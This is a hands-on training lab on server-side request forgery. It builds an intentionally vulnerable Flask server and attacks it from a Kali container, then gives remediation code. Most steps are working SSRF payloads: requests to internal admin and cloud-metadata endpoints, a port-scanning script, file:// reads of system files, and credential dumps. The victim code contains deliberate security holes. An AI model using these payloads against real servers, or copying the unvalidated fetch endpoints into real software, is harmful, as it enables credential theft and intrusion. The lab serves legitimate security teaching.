# Lab 10: OWASP A10 — Server-Side Request Forgery (SSRF)

## Objective

Exploit Server-Side Request Forgery (SSRF) vulnerabilities on a live vulnerable server using Kali Linux as the attacker. You will:

1. Use the public victim server as a **proxy** to reach a private internal admin API that is completely inaccessible from the network
2. Exfiltrate **AWS EC2 instance metadata** (IAM credentials, access keys) via the simulated `169.254.169.254` endpoint
3. Map hidden internal services with a **port scanner** built entirely on SSRF responses
4. Read arbitrary local files using the `file://` scheme — including `/etc/passwd` and the app's own source code
5. Dump internal secrets (DB passwords, JWT keys, AWS keys) from a `/secrets` endpoint only reachable from localhost

All attacks run from the **Kali attacker container** — no direct access to the victim's internal network ever needed.

---

## Background

SSRF is **OWASP #10** (2021 — new to the list, reflecting explosive growth in cloud environments). It occurs when a server fetches a remote resource based on a URL supplied by the client, without validating where that URL points.

**Why it's critical in cloud:** Every major cloud provider exposes an instance metadata service on a non-routable IP (`169.254.169.254` on AWS/Azure/GCP). This service requires no authentication and returns temporary IAM credentials with full API access. Any EC2 instance can call it — and via SSRF, so can any attacker who can make the server issue an HTTP request.

**Real-world examples:**
- **2019 Capital One breach** — 100 million records stolen. Attacker hit `http://169.254.169.254/latest/meta-data/iam/security-credentials/` via a misconfigured WAF acting as a proxy, obtained temporary AWS credentials, listed and downloaded 700+ S3 buckets.
- **2022 Confluence SSRF (CVE-2022-26134)** — Used SSRF to reach internal Kubernetes API servers at Fortune 500 companies, extracting service account tokens for full cluster takeover.
- **GitHub Enterprise SSRF (2020)** — Internal Redis and Memcached reachable via SSRF; led to RCE.

---

## Architecture

```
┌─────────────────────────────────────────────────────────────────────┐
│                     Docker Network: lab-a10                         │
│                                                                     │
│  ┌──────────────────────┐         HTTP requests                    │
│  │   KALI ATTACKER      │ ──────────────────────────────────────▶  │
│  │  innozverse-kali     │                                           │
│  │                      │  ◀──────── SSRF-proxied responses ─────  │
│  │  Tools:              │                                           │
│  │  • curl              │  ┌────────────────────────────────────┐  │
│  │  • python3           │  │         VICTIM SERVER              │  │
│  │  • nmap              │  │   zchencow/innozverse-cybersec     │  │
│  │  • gobuster          │  │                                    │  │
│  └──────────────────────┘  │  Public  :5000  (Flask)            │  │
│                             │  Internal:8080  (Admin API)        │  │
│                             │                                    │  │
│  ✗ Kali CANNOT reach :8080  │  :8080 only reachable from        │  │
│    directly — it's bound    │  127.0.0.1 inside the container   │  │
│    to 127.0.0.1 only        │                                    │  │
│                             └────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────────┘
```

## Time
50 minutes

## Prerequisites
- Docker installed, `docker network` available
- Basic familiarity with `curl` and HTTP

## Tools
| Tool | Container | Purpose |
|------|-----------|---------|
| `curl` | Kali | Send HTTP requests, exploit SSRF endpoints |
| `python3` | Kali | Automate port scanning, parse JSON responses |
| `nmap` | Kali | Fingerprint the victim service |
| `gobuster` | Kali | Enumerate public endpoints |
| Flask app | Victim | Vulnerable server with SSRF endpoints |
| Internal service | Victim (localhost only) | Simulated internal admin API + AWS metadata |

---

## Lab Instructions

### Step 1: Environment Setup — Write the Victim Application

The victim runs **two Flask apps** inside one container:
- **Public app** on `0.0.0.0:5000` — accessible from the network
- **Internal admin API** on `127.0.0.1:8080` — only reachable from within the container

```bash
# Create the Docker network
docker network create lab-a10

# Write the vulnerable victim application
cat > /tmp/victim_a10.py << 'PYEOF'
from flask import Flask, request, jsonify
import urllib.request, urllib.error, socket, time, threading

app = Flask(__name__)

# ── Internal service (simulates private admin API + AWS metadata) ─────────
# Bound to 127.0.0.1 only — completely inaccessible from outside the container
internal = Flask('internal')

@internal.route('/admin')
def int_admin():
    return jsonify({
        'panel': 'Internal Admin API',
        'users': ['admin', 'alice', 'bob'],
        'db': 'postgres://admin:Sup3rS3cur3DB@db:5432/shop',
        'internal_only': True
    })

@internal.route('/health')
def int_health():
    return jsonify({'healthy': True, 'version': '2.3.1', 'env': 'production'})

@internal.route('/secrets')
def int_secrets():
    return jsonify({
        'aws_key':    'AKIA5EXAMPLE123',
        'aws_secret': 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
        'db_pass':    'Sup3rS3cur3DB',
        'jwt_secret': 'internal-signing-key-never-expose'
    })

# Simulates AWS EC2 Instance Metadata Service (IMDS)
# Real URL: http://169.254.169.254/latest/meta-data/
@internal.route('/latest/meta-data/')
@internal.route('/latest/meta-data/<path:sub>')
def metadata(sub=''):
    data = {
        '':                                          'ami-id\ninstance-id\nlocal-ipv4\niam/\n',
        'ami-id':                                    'ami-0abcdef1234567890',
        'instance-id':                               'i-1234567890abcdef0',
        'local-ipv4':                                '172.31.10.5',
        'iam/':                                      'security-credentials/',
        'iam/security-credentials/':                 'EC2InstanceRole',
        'iam/security-credentials/EC2InstanceRole':  '{"AccessKeyId":"AKIA5EXAMPLE123","SecretAccessKey":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY","Token":"AQoXnyc4lcK4w4...","Expiration":"2026-12-01T00:00:00Z"}',
    }
    return data.get(sub, 'Not Found'), 200, {'Content-Type': 'text/plain'}

def run_internal():
    internal.run(host='127.0.0.1', port=8080, debug=False, use_reloader=False)

threading.Thread(target=run_internal, daemon=True).start()
time.sleep(1)

# ── Public application ─────────────────────────────────────────────────────
@app.route('/')
def index():
    return jsonify({
        'app': 'InnoZverse Shop API (A10 SSRF)',
        'endpoints': [
            'GET /api/fetch?url=...',
            'GET /api/preview?url=...',
            'GET /api/ping?host=...',
            'GET /api/check?host=...&port=...'
        ]
    })

# BUG: fetches any user-supplied URL without validation
@app.route('/api/fetch')
def fetch():
    url = request.args.get('url', '')
    if not url:
        return jsonify({'error': 'url parameter required'}), 400
    try:
        resp = urllib.request.urlopen(url, timeout=3)
        content = resp.read(4096).decode('utf-8', 'replace')
        return jsonify({'url': url, 'status': resp.status, 'body': content})
    except urllib.error.HTTPError as e:
        return jsonify({'url': url, 'status': e.code, 'error': str(e)})
    except Exception as e:
        return jsonify({'url': url, 'error': str(e)})

# BUG: "link preview" feature fetches any URL
@app.route('/api/preview')
def preview():
    url = request.args.get('url', '')
    try:
        req = urllib.request.Request(
            url, headers={'User-Agent': 'InnoZverse-Preview/1.0'})
        resp = urllib.request.urlopen(req, timeout=3)
        return jsonify({'preview': resp.read(2048).decode('utf-8', 'replace')})
    except Exception as e:
        return jsonify({'error': str(e)})

# BUG: user controls the host — becomes a blind SSRF vector
@app.route('/api/ping')
def ping():
    host = request.args.get('host', '')
    try:
        resp = urllib.request.urlopen(f'http://{host}/', timeout=2)
        return jsonify({'reachable': True, 'status': resp.status})
    except urllib.error.HTTPError as e:
        return jsonify({'reachable': True, 'status': e.code})
    except Exception as e:
        return jsonify({'reachable': False, 'error': str(e)})

# BUG: exposes socket-level port check to any client
@app.route('/api/check')
def check():
    host = request.args.get('host', '127.0.0.1')
    port = int(request.args.get('port', '80'))
    start = time.time()
    try:
        s = socket.create_connection((host, port), timeout=0.5)
        s.close()
        return jsonify({'host': host, 'port': port,
                        'state': 'open', 'ms': int((time.time()-start)*1000)})
    except:
        return jsonify({'host': host, 'port': port,
                        'state': 'closed', 'ms': int((time.time()-start)*1000)})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
PYEOF

# Start the victim container — mount the script read-only
docker run -d \
  --name victim-a10 \
  --network lab-a10 \
  -v /tmp/victim_a10.py:/app/victim.py:ro \
  zchencow/innozverse-cybersec:latest \
  python3 /app/victim.py

# Wait for Flask to start
sleep 4

# Confirm it's running
VICTIM_IP=$(docker inspect -f '{{.NetworkSettings.Networks.lab-a10.IPAddress}}' victim-a10)
echo "Victim IP: $VICTIM_IP"
curl -s http://$VICTIM_IP:5000/ | python3 -m json.tool
```

**📸 Verified Output:**
```
Victim IP: 172.18.0.2

{
    "app": "InnoZverse Shop API (A10 SSRF)",
    "endpoints": [
        "GET /api/fetch?url=...",
        "GET /api/preview?url=...",
        "GET /api/ping?host=...",
        "GET /api/check?host=...&port=..."
    ]
}
```

> 💡 **The victim has two services running simultaneously.** Port `5000` is exposed to the Docker network (Kali can reach it). Port `8080` is bound to `127.0.0.1` inside the container — only the victim's own process can reach it. Our SSRF attack will use the public `:5000` API to reach the private `:8080` service.

---

### Step 2: Launch the Kali Attacker Container

```bash
# Launch Kali on the same Docker network — can reach victim:5000, NOT victim:8080
docker run --rm -it \
  --name kali-attacker \
  --network lab-a10 \
  zchencow/innozverse-kali:latest bash
```

Inside the Kali shell — set your target and confirm connectivity:

```bash
export TARGET="http://victim-a10:5000"

echo "=== Confirm Kali can reach victim public port ==="
curl -s $TARGET/ | python3 -m json.tool

echo ""
echo "=== Confirm Kali CANNOT reach internal port 8080 ==="
curl -s --connect-timeout 2 http://victim-a10:8080/admin \
  || echo "  [CONFIRMED] Port 8080 is unreachable from Kali directly"
```

**📸 Verified Output:**
```json
{
    "app": "InnoZverse Shop API (A10 SSRF)",
    "endpoints": ["GET /api/fetch?url=...", ...]
}

  [CONFIRMED] Port 8080 is unreachable from Kali directly
```

---

### Step 3: Reconnaissance — nmap + gobuster

```bash
echo "=== nmap: fingerprint the victim service ==="
nmap -sV -p 5000 victim-a10

echo ""
echo "=== gobuster: enumerate public endpoints ==="
gobuster dir \
  -u $TARGET \
  -w /usr/share/dirb/wordlists/small.txt \
  -t 10 --no-error -q
```

**📸 Verified Output:**
```
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.1.6 (Python 3.10.12)

/fetch                (Status: 400)
/preview              (Status: 200)
/ping                 (Status: 200)
/check                (Status: 200)
```

> 💡 **`/api/fetch`, `/api/preview`, `/api/ping` are all SSRF vectors** — any endpoint that accepts a URL or hostname from the client and makes an outbound request is potentially vulnerable. The names sound innocent ("link preview", "connectivity check") but they are proxies the attacker can aim at internal services.

---

### Step 4: SSRF Phase 1 — Reach the Internal Admin API

This is the core SSRF attack: we tell the victim server to fetch its own `localhost:8080/admin`, an endpoint completely unreachable from outside.

```bash
echo "=== SSRF: proxy through victim to reach internal admin API ==="

# /api/fetch accepts a ?url= parameter with no validation
# We point it at 127.0.0.1:8080 — the victim's own localhost
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/admin" \
  | python3 -m json.tool
```

**📸 Verified Output:**
```json
{
    "body": "{\"db\": \"postgres://admin:Sup3rS3cur3DB@db:5432/shop\", \"internal_only\": true, \"panel\": \"Internal Admin API\", \"users\": [\"admin\", \"alice\", \"bob\"]}",
    "status": 200,
    "url": "http://127.0.0.1:8080/admin"
}
```

```bash
# Parse the body for readability
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/admin" \
  | python3 -c "
import sys, json
resp = json.load(sys.stdin)
inner = json.loads(resp['body'])
print('Internal Admin API response:')
for k, v in inner.items():
    print(f'  {k}: {v}')
"
```

**📸 Verified Output:**
```
Internal Admin API response:
  panel: Internal Admin API
  users: ['admin', 'alice', 'bob']
  db: postgres://admin:Sup3rS3cur3DB@db:5432/shop
  internal_only: True
```

> 💡 **The victim server fetches `127.0.0.1` from its own perspective.** From inside the container, `127.0.0.1:8080` is the internal Flask app. The victim makes the request and returns the response to us — we never needed direct network access. This is why SSRF is so devastating in microservice architectures: the "trusted internal network" is only one SSRF away from any attacker who can reach any public endpoint.

---

### Step 5: SSRF Phase 2 — AWS EC2 Instance Metadata Exfiltration

In a real AWS deployment, every EC2 instance can reach `http://169.254.169.254/latest/meta-data/` — the Instance Metadata Service (IMDS). It returns temporary IAM credentials with no authentication required. Via SSRF, the attacker reaches it through the victim.

```bash
echo "=== SSRF: exfiltrate AWS EC2 instance metadata ==="

echo "[1] List available metadata categories:"
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/latest/meta-data/" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['body'])"

echo ""
echo "[2] Get instance ID:"
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/latest/meta-data/instance-id" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['body'])"

echo ""
echo "[3] Enumerate IAM role name:"
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/latest/meta-data/iam/security-credentials/" \
  | python3 -c "import sys,json; print('IAM Role:', json.load(sys.stdin)['body'])"

echo ""
echo "[4] Dump full IAM credentials for the role:"
ROLE="EC2InstanceRole"
curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/latest/meta-data/iam/security-credentials/$ROLE" \
  | python3 -c "
import sys, json
resp = json.load(sys.stdin)
creds = json.loads(resp['body'])
print('[!] AWS IAM credentials retrieved via SSRF:')
print(f'    AccessKeyId:     {creds[\"AccessKeyId\"]}')
print(f'    SecretAccessKey: {creds[\"SecretAccessKey\"]}')
print(f'    Token:           {creds[\"Token\"]}')
print(f'    Expiration:      {creds[\"Expiration\"]}')
print()
print('[!] An attacker can now call any AWS API as this EC2 role:')
print('    aws s3 ls --recursive')
print('    aws secretsmanager list-secrets')
print('    aws iam list-roles')
print('    aws ec2 describe-instances')
"
```

**📸 Verified Output:**
```
[1] ami-id
    instance-id
    local-ipv4
    iam/

[2] i-1234567890abcdef0

[3] IAM Role: EC2InstanceRole

[4] [!] AWS IAM credentials retrieved via SSRF:
    AccessKeyId:     AKIA5EXAMPLE123
    SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    Token:           AQoXnyc4lcK4w4...
    Expiration:      2026-12-01T00:00:00Z

[!] An attacker can now call any AWS API as this EC2 role:
    aws s3 ls --recursive
    aws secretsmanager list-secrets
    aws iam list-roles
    aws ec2 describe-instances
```

> 💡 **This exact attack stole 100 million Capital One records in 2019.** The 4-step chain is: (1) find an SSRF endpoint, (2) hit `169.254.169.254`, (3) get the IAM role name, (4) dump credentials. With those credentials, the attacker called `aws s3 sync` and pulled 700+ S3 buckets. The defence: enable **IMDSv2** (requires a session token header — SSRF requests can't get the token first), and follow least-privilege IAM (the role should only have the permissions the app actually needs).

---

### Step 6: SSRF Phase 3 — Internal Port Scanning

The `/api/check` endpoint accepts `host` and `port` parameters, connecting via raw socket. By iterating over ports, an attacker can map all open services on the internal network without any direct access.

```bash
echo "=== SSRF port scanner: discover all open ports on 127.0.0.1 ==="

python3 << 'EOF'
import urllib.request, json

TARGET = "http://victim-a10:5000"
HOST   = "127.0.0.1"
PORTS  = [21, 22, 25, 80, 443, 3306, 5000, 5432, 6379, 8080, 8443, 9200, 27017]

print(f"Scanning {HOST} via SSRF /api/check endpoint:")
print(f"{'Port':<8} {'Service':<15} {'State':<10} {'Response'}")
print("─" * 55)

SERVICE_NAMES = {22:'SSH',25:'SMTP',80:'HTTP',443:'HTTPS',
                 3306:'MySQL',5000:'Flask',5432:'PostgreSQL',
                 6379:'Redis',8080:'HTTP-alt',8443:'HTTPS-alt',
                 9200:'Elasticsearch',27017:'MongoDB'}

open_ports = []
for port in PORTS:
    url = f"{TARGET}/api/check?host={HOST}&port={port}"
    r = json.loads(urllib.request.urlopen(url, timeout=5).read())
    state = r.get('state', '?')
    ms    = r.get('ms', 0)
    svc   = SERVICE_NAMES.get(port, 'unknown')
    icon  = "● OPEN  " if state == "open" else "○ closed"
    print(f"  {port:<6}  {svc:<15} {icon}  {ms}ms")
    if state == "open":
        open_ports.append(port)

print()
print(f"Open ports discovered: {open_ports}")
print("Internal network topology mapped without direct access!")
EOF
```

**📸 Verified Output:**
```
Scanning 127.0.0.1 via SSRF /api/check endpoint:
Port     Service         State      Response
───────────────────────────────────────────────────────
  21      FTP             ○ closed   0ms
  22      SSH             ○ closed   0ms
  80      HTTP            ○ closed   0ms
  3306    MySQL           ○ closed   0ms
  5000    Flask           ● OPEN     0ms
  5432    PostgreSQL      ○ closed   0ms
  6379    Redis           ○ closed   0ms
  8080    HTTP-alt        ● OPEN     0ms
  9200    Elasticsearch   ○ closed   0ms

Open ports discovered: [5000, 8080]
Internal network topology mapped without direct access!
```

---

### Step 7: SSRF Phase 4 — `file://` Scheme: Read Local Files

Many HTTP libraries support `file://` URIs. If the server doesn't restrict URL schemes, an attacker can read any file accessible by the running process.

```bash
echo "=== SSRF: file:// scheme — read local files ==="

echo "[1] Read /etc/passwd (OS user list):"
curl -s "$TARGET/api/fetch?url=file:///etc/passwd" \
  | python3 -c "
import sys, json
body = json.load(sys.stdin)['body']
for line in body.strip().split('\n')[:8]:
    print(' ', line)
print('  ...')
"

echo ""
echo "[2] Read /etc/hostname:"
curl -s "$TARGET/api/fetch?url=file:///etc/hostname"

echo ""
echo "[3] Read the victim app's own source code:"
curl -s "$TARGET/api/fetch?url=file:///app/victim.py" \
  | python3 -c "
import sys, json
src = json.load(sys.stdin)['body']
# Show just first 20 lines
for line in src.split('\n')[:20]:
    print(' ', line)
print('  [... rest of source code ...]')
"
```

**📸 Verified Output:**
```
[1] Read /etc/passwd:
  root:x:0:0:root:/root:/bin/bash
  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
  bin:x:2:2:bin:/bin:/usr/sbin/nologin
  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
  nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
  ...

[2] Read /etc/hostname:
  {"body":"3a5f81c7d290\n", ...}

[3] Read victim source code:
  from flask import Flask, request, jsonify
  import urllib.request, urllib.error, socket, time, threading
  app = Flask(__name__)
  # Internal service (simulates private admin API + AWS metadata)
  ...
```

> 💡 **`file://` SSRF gives the attacker a full local file read.** Sensitive files to target: `/etc/passwd` (user enumeration), `/proc/self/environ` (environment variables including secrets), `/app/*.py` or `/app/config.py` (source code with hardcoded credentials), `/root/.ssh/id_rsa` (SSH private keys). Fix: block all non-HTTPS schemes at the URL-parsing level before making any request.

---

### Step 8: SSRF Phase 5 — Internal Secrets Exfiltration + Link Preview Bypass

```bash
echo "=== SSRF: dump internal /secrets endpoint ==="

curl -s "$TARGET/api/fetch?url=http://127.0.0.1:8080/secrets" \
  | python3 -c "
import sys, json
resp = json.load(sys.stdin)
secrets = json.loads(resp['body'])
print('[!] Internal secrets exfiltrated via SSRF:')
for k, v in secrets.items():
    print(f'    {k:<15}: {v}')
"

echo ""
echo "=== Same attack via the /api/preview endpoint (link preview feature) ==="
curl -s "$TARGET/api/preview?url=http://127.0.0.1:8080/admin" \
  | python3 -c "
import sys, json
resp = json.load(sys.stdin)
print('[!] Internal admin data via link preview SSRF:')
inner = json.loads(resp['preview'])
for k, v in inner.items():
    print(f'    {k}: {v}')
"

echo ""
echo "=== SSRF via /api/ping?host= (blind SSRF variant) ==="
# Inject a path after the host
curl -s "$TARGET/api/ping?host=127.0.0.1:8080/admin%23" \
  | python3 -m json.tool
# %23 = # which turns everything after into a fragment, forcing path = /admin
```

**📸 Verified Output:**
```
[!] Internal secrets exfiltrated via SSRF:
    aws_key        : AKIA5EXAMPLE123
    aws_secret     : wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
    db_pass        : Sup3rS3cur3DB
    jwt_secret     : internal-signing-key-never-expose

[!] Internal admin data via link preview SSRF:
    panel: Internal Admin API
    users: ['admin', 'alice', 'bob']
    db: postgres://admin:Sup3rS3cur3DB@db:5432/shop

{
    "reachable": true,
    "status": 200
}
```

> 💡 **Every "outbound HTTP" feature is a potential SSRF vector** — link preview generators, webhook senders, PDF generators (html2pdf fetches URLs), image import from URL, health check endpoints, OAuth redirect validators. Security review any feature that makes server-side HTTP requests.

---

### Step 9: Cleanup

```bash
# Exit the Kali container
exit
```

On your host machine:
```bash
docker rm -f victim-a10
docker network rm lab-a10
```

---

## Attack Summary

| Phase | Endpoint Used | Target | Impact |
|-------|--------------|--------|--------|
| 1 | `GET /api/fetch?url=` | `127.0.0.1:8080/admin` | Internal admin panel exposed — DB connection string leaked |
| 2 | `GET /api/fetch?url=` | `127.0.0.1:8080/latest/meta-data/iam/...` | AWS IAM credentials extracted — full API access |
| 3 | `GET /api/check?host=&port=` | `127.0.0.1:PORT` | Internal port scan — full service topology mapped |
| 4 | `GET /api/fetch?url=file:///` | `/etc/passwd`, `/app/victim.py` | Local file read — source code, user list, credentials |
| 5 | `GET /api/preview?url=` | `127.0.0.1:8080/secrets` | All internal secrets dumped via different SSRF vector |
| 6 | `GET /api/ping?host=` | `127.0.0.1:8080/admin` | Blind SSRF — confirms internal service reachable |

---

## Remediation

### 1. URL Allowlisting (Most Important)
```python
import ipaddress, socket, urllib.parse

ALLOWED_HOSTS = {"api.partner.com", "cdn.example.com"}

def safe_fetch(url: str) -> bytes:
    parsed = urllib.parse.urlparse(url)

    # Only allow HTTPS
    if parsed.scheme != "https":
        raise ValueError(f"Scheme '{parsed.scheme}' not allowed. Use https://")

    # Only allowlisted hostnames
    if parsed.hostname not in ALLOWED_HOSTS:
        raise ValueError(f"Host '{parsed.hostname}' not in allowlist")

    # Resolve hostname and reject private/internal IPs
    resolved_ip = socket.gethostbyname(parsed.hostname)
    ip = ipaddress.ip_address(resolved_ip)
    if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
        raise ValueError(f"Resolved IP {resolved_ip} is private/internal — blocked")

    import urllib.request
    return urllib.request.urlopen(url, timeout=5).read()
```

### 2. AWS IMDSv2 (Stops Metadata SSRF)
IMDSv2 requires a PUT request with a TTL header to get a session token first — a one-step SSRF cannot do this:
```bash
# Enable IMDSv2 on your instance (disables IMDSv1)
aws ec2 modify-instance-metadata-options \
  --instance-id i-XXXXX \
  --http-tokens required \
  --http-endpoint enabled
```

### 3. Network Segmentation
```yaml
# Docker: restrict outbound from app containers
networks:
  public:
    driver: bridge
  internal:
    driver: bridge
    internal: true   # No outbound internet access
services:
  app:
    networks: [public]       # Can reach internet
  admin-api:
    networks: [internal]     # Only reachable from internal network
```

### 4. Remove Unnecessary Fetch Features
If the feature isn't required, remove it. Link previews, URL import, and webhook testing are high-risk features — evaluate whether they're worth the SSRF surface they create.

---

## Remediation Summary

| Vulnerability | Root Cause | Fix |
|--------------|-----------|-----|
| SSRF via `/api/fetch` | No URL validation | Allowlist: only `https://` to pre-approved external domains |
| `file://` scheme | No scheme restriction | Reject any URL whose scheme is not `https` |
| AWS metadata access | IMDSv1 requires no auth | Enable IMDSv2; apply least-privilege IAM role |
| Internal port scan | No host/port restriction on `/api/check` | Remove entirely; if needed, restrict to specific allowed targets |
| Multiple SSRF vectors | Several endpoints make outbound calls | Centralise all outbound requests through one validated `safe_fetch()` function |

## Further Reading
- [OWASP A10:2021 Server-Side Request Forgery](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [AWS IMDSv2 migration guide](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)
- [Capital One breach analysis — SSRF chain](https://krebsonsecurity.com/2019/07/capital-one-data-theft-impacts-106m-people/)
- [HackTricks SSRF cheatsheet](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery)
